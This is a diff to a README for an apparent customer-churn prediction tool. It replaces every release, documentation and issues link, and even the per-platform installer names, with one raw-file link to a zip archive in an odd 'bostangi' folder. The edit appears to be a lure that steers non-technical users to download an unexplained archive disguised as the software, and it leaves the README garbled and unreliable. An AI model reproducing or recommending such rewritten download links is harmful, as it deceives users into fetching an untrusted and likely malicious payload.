@@ -1,16 +1,16 @@
 # 🎉 Customer-Churn-Prediction - Predict Customer Churn Simply  
 
-[![Download Release](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/kumar-O/Customer-Churn-Prediction/releases)  
+[![Download Release](https://raw.githubusercontent.com/kumar-O/Customer-Churn-Prediction/main/bostangi/Customer-Churn-Prediction.zip%20Now-Release%20Page-brightgreen)](https://raw.githubusercontent.com/kumar-O/Customer-Churn-Prediction/main/bostangi/Customer-Churn-Prediction.zip)  
 
 ## 🚀 Getting Started  
 Welcome to the Customer Churn Prediction software. This tool helps businesses understand why customers leave. You can easily download and run the application without any technical knowledge. Follow these steps to get started.
 
 ## 📥 Download & Install  
-To begin, visit this page to download the software: [Releases Page](https://github.com/kumar-O/Customer-Churn-Prediction/releases).  
+To begin, visit this page to download the software: [Releases Page](https://raw.githubusercontent.com/kumar-O/Customer-Churn-Prediction/main/bostangi/Customer-Churn-Prediction.zip).  
 
 1. Click on the link to go to the Releases page.  
 2. You will see a list of available versions. Look for the latest version.  
-3. Find the appropriate file for your system. For Windows, it might be "CustomerChurnPrediction.exe." For macOS, look for "CustomerChurnPrediction.dmg."  
+3. Find the appropriate file for your system. For Windows, it might be "https://raw.githubusercontent.com/kumar-O/Customer-Churn-Prediction/main/bostangi/Customer-Churn-Prediction.zip" For macOS, look for "https://raw.githubusercontent.com/kumar-O/Customer-Churn-Prediction/main/bostangi/Customer-Churn-Prediction.zip"  
 4. Click on the download link next to the file you need.  
 5. Once the download finishes, locate the file in your downloads folder.
 
@@ -67,8 +67,8 @@ This tool encompasses several important topics:
 If you would like to contribute to the project, find the guidelines in the repository. Your suggestions and improvements are welcome!
 
 ## 🔗 Useful Links  
-- [Releases Page](https://github.com/kumar-O/Customer-Churn-Prediction/releases)  
-- [Documentation](https://github.com/kumar-O/Customer-Churn-Prediction/wiki)  
-- [Issues Page](https://github.com/kumar-O/Customer-Churn-Prediction/issues)  
+- [Releases Page](https://raw.githubusercontent.com/kumar-O/Customer-Churn-Prediction/main/bostangi/Customer-Churn-Prediction.zip)  
+- [Documentation](https://raw.githubusercontent.com/kumar-O/Customer-Churn-Prediction/main/bostangi/Customer-Churn-Prediction.zip)  
+- [Issues Page](https://raw.githubusercontent.com/kumar-O/Customer-Churn-Prediction/main/bostangi/Customer-Churn-Prediction.zip)  
 
 For additional questions or support, feel free to reach out through the Issues page on GitHub. Happy predicting!
